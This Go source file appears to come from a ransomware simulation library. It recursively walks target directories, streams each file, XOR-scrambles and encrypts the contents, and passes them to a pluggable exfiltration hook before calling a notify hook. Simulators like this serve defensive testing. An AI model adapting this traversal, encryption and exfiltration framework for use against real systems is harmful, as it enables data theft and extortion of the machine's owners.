package ransimware

import (
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"

	"gitlab.com/mjwhitta/pathname"
	tp "gitlab.com/mjwhitta/threadpool"
)

// Simulator is a struct containing all simulation metadata.
type Simulator struct {
	Encrypt func(fn string, b []byte) ([]byte, error)
	Exfil   func(fn string, b []byte) error
	Notify  func() error
	otp     [32]byte
	paths   []string
	Threads int
}

// New will return a pointer to a new Simulator instance.
func New(threads int) *Simulator {
	var e error
	var s = &Simulator{
		Encrypt: DefaultEncrypt,
		Exfil:   DefaultExfil,
		Notify:  DefaultNotify,
		Threads: threads,
	}

	if _, e = rand.Read(s.otp[:]); e != nil {
		// Fallback to hard-coded incrementing bytes
		s.otp[0] = 0x41
		for i := 1; i < 32; i++ {
			s.otp[i] = s.otp[i-1] + 1
		}
	}

	return s
}

func (s *Simulator) processFile(tid int, data tp.ThreadData) {
	var contents []byte = make([]byte, ReadSize)
	var e error
	var f *os.File
	var n int
	var path string = data["path"].(string)
	var tmp []byte

	if f, e = os.Open(path); e != nil {
		fmt.Println(e.Error())
		return
	}
	defer f.Close()

	// Stream file
	for {
		// Read file
		if n, e = f.Read(contents[:]); e != nil {
			if (n == 0) && (e == io.EOF) {
				f.Close()
			} else {
				return
			}
		}

		// Turn file contents into garbage
		for i := 0; i < n; i++ {
			contents[i] ^= s.otp[i%32]
		}

		// Encrypt contents
		if tmp, e = s.Encrypt(path, contents[:n]); e != nil {
			fmt.Println(e.Error())
			tmp = contents[:n]
		}

		// Exfil
		if e = s.Exfil(path, tmp); e != nil {
			fmt.Println(e.Error())
		}
	}
}

// Target will add a path to the simulator.
func (s *Simulator) Target(path string) error {
	// Ensure path exists
	if !pathname.DoesExist(path) {
		return fmt.Errorf("Path %s does not exist", path)
	}

	s.paths = append(s.paths, path)
	return nil
}

// Run will start the simulator.
func (s *Simulator) Run() error {
	var e error
	var pool *tp.ThreadPool

	// Initialize ThreadPool
	if pool, e = tp.New(s.Threads); e != nil {
		return e
	}
	defer pool.Close()

	// Walk paths
	for _, root := range s.paths {
		e = filepath.Walk(
			root,
			func(path string, info os.FileInfo, e error) error {
				if e != nil {
					// Ignore errors as we want to traverse everything
					// we possibly can
					return nil
				}

				// Ignore directories
				if info.IsDir() {
					return nil
				}

				// Process file
				pool.Queue(s.processFile, tp.ThreadData{"path": path})

				return nil
			},
		)
		if e != nil {
			fmt.Println(e.Error())
		}
	}

	// Wait for all threads to finish
	pool.Wait()

	return s.Notify()
}
